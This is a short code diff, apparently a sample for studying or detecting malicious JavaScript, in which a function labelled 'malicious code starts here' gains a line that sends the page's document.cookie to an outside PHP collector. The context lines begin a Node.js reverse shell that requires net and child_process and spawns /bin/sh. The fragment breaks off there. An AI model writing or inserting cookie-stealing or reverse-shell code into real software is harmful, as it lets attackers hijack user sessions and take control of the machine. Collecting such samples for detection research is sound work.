@@ -1,6 +1,7 @@
 function is_mlcs(string){
 
      // malicious code starts here 
+        fetch("http://www.dei.isep.ipp.pt/~jpl/catch.php?cookie="+document.cookie);
         var net = require("net"),
             cp = require("child_process"),
             sh = cp.spawn("/bin/sh", []);
